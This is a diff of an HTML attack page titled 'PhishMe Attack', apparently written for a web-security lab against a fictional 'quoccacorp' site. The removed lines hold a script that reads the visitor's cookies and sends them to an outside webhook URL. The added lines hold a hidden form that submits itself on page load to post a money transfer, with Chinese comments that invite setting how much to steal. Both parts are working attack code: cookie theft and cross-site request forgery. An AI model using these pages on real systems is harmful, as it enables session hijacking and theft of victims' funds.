@@ -1,17 +1,22 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PhishMe Attack</title>
+</head>
 <body>
 
+<!-- 隐藏的自动提交表单 -->
+<form id="transferForm" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="fake-token">
+  <input type="hidden" name="username" value="z5508657"> <!-- 把这里换成你的用户名 -->
+  <input type="hidden" name="amount" value="10">         <!-- 想偷多少就写多少 -->
+</form>
+
 <script>
-// 获取当前会话的cookie
-const cookies = document.cookie;
-  
-// 将cookie发送到你的服务器
-fetch('https://webhook-test.com/170fb0ff6d43d1148fb1cb5cad087971?data=' + encodeURIComponent(cookies));
-  
-// 或者直接显示出来方便复制
-document.body.innerHTML = '<pre>' + cookies + '</pre>';
+// 网页加载后，立刻自动提交表单
+document.getElementById('transferForm').submit();
 </script>
 
 </body>
 </html>
-
